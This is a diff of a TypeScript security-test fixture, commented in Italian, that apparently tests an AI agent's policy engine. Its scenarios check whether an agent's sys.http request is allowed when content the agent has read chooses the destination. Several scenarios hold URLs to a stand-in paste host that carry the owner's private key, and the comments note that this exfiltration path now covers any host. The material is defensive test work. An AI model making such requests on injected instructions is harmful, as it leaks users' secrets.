@@ -20,7 +20,7 @@ import type { Decision } from '../../core/policy/types.js';
  * un'annotazione: una scena nuova a monte fa cadere quella riga invece di
  * arrivare a B con un default silenzioso.
  */
-export const FLOW_BY_SCENARIO: Readonly<Record<string, ResourceChooser>> = {
+const FLOW_BY_SCENARIO: Readonly<Record<string, ResourceChooser>> = {
   // L'owner ha nominato `/workspace/result.txt` nel suo messaggio; il file
   // letto ha solo fornito i byte da scrivere.
   's1-local-read-owner-write': 'owner',
@@ -42,7 +42,8 @@ export type FlowScenario = SecurityBaselineScenario & {
   readonly expectTuple: Decision['effect'];
 };
 
-const url = (value: string) => ({ kind: 'url' as const, value });
+/** `sys.http`'s real shape since ADR-0066: reading, not acting — see `agent/tools/http.ts`. */
+const urlRead = (value: string) => ({ kind: 'url-read' as const, value });
 const path = (value: string) => ({ kind: 'path' as const, value });
 
 /**
@@ -55,19 +56,19 @@ const path = (value: string) => ({ kind: 'path' as const, value });
  * divergere *in favore di B*: A vede lo stesso numero nei due membri e deve
  * rispondere lo stesso, qualunque sia la risposta.
  */
-export const FLOW_SCENARIOS: readonly FlowScenario[] = [
+const FLOW_SCENARIOS: readonly FlowScenario[] = [
   {
     id: 'f1-egress-allowlisted-owner-chosen',
     family: 'external-value',
     flow: 'owner',
     expectTuple: 'allow',
     claim:
-      "l'owner nomina una destinazione già in allowlist e ci manda dei byte: A e B la lasciano passare, ed è il membro «utility» della coppia",
+      "l'owner nomina una destinazione e ci manda dei byte (ADR-0066: sys.http legge in apertura, nessuna allowlist da nominare più): A e B la lasciano passare, ed è il membro «utility» della coppia",
     action: {
       principal: OWNER,
       tenant: 'host',
       capability: 'sys.http',
-      resource: url('https://paste.example.test/collect?q=changelog'),
+      resource: urlRead('https://paste.example.test/collect?q=changelog'),
       args: { url: 'https://paste.example.test/collect?q=changelog' },
       ambientTaint: 2,
     },
@@ -87,17 +88,20 @@ export const FLOW_SCENARIOS: readonly FlowScenario[] = [
      * a entrambi, e non per un difetto: a taint 2 `paramsMaxTaint` è
      * soddisfatto (`POLICY_FLOOR.paramsMaxTaint === 2`, decisione owner del
      * 17/08) e lo scalare non ha un campo in cui la differenza possa esistere.
-     * È il residuo che il threat model dichiara — *"esfiltrazione verso un
-     * dominio in allowlist"* (`03-threat-model.md:117`) — misurato invece che
-     * citato.
+     * Prima di ADR-0066 il residuo che il threat model dichiarava era
+     * *"esfiltrazione verso un dominio in allowlist"* (`03-threat-model.md:117`);
+     * da ADR-0066 `sys.http` è `url-read` e non c'è più un'allowlist da cui
+     * uscire — il residuo è lo stesso, misurato sullo stesso meccanismo
+     * (`paramsMaxTaint`), ma ora vale per **qualunque** host, non solo per uno
+     * che l'owner aveva già approvato.
      */
     claim:
-      'la stessa richiesta, con la destinazione scelta dal contenuto letto: A non ha un campo in cui la differenza possa esistere e la lascia passare a taint 2',
+      "la stessa richiesta, con la destinazione scelta dal contenuto letto: A non ha un campo in cui la differenza possa esistere e la lascia passare a taint 2 — vero prima di ADR-0066 con l'allowlist, vero dopo senza",
     action: {
       principal: OWNER,
       tenant: 'host',
       capability: 'sys.http',
-      resource: url('https://paste.example.test/collect?data=chiave-privata-dell-owner'),
+      resource: urlRead('https://paste.example.test/collect?data=chiave-privata-dell-owner'),
       args: { url: 'https://paste.example.test/collect?data=chiave-privata-dell-owner' },
       ambientTaint: 2,
     },
@@ -114,7 +118,7 @@ export const FLOW_SCENARIOS: readonly FlowScenario[] = [
       principal: OWNER,
       tenant: 'host',
       capability: 'sys.http',
-      resource: url('https://paste.example.test/collect?data=chiave-privata-dell-owner'),
+      resource: urlRead('https://paste.example.test/collect?data=chiave-privata-dell-owner'),
       args: { url: 'https://paste.example.test/collect?data=chiave-privata-dell-owner' },
       ambientTaint: 3,
     },
@@ -170,7 +174,7 @@ export const FLOW_SCENARIOS: readonly FlowScenario[] = [
 ];
 
 /** Ogni scena della baseline, annotata — o un errore, mai un default. */
-export function flowOf(scenario: SecurityBaselineScenario): ResourceChooser {
+function flowOf(scenario: SecurityBaselineScenario): ResourceChooser {
   const found = FLOW_BY_SCENARIO[scenario.id];
   if (found === undefined) {
     throw new Error(
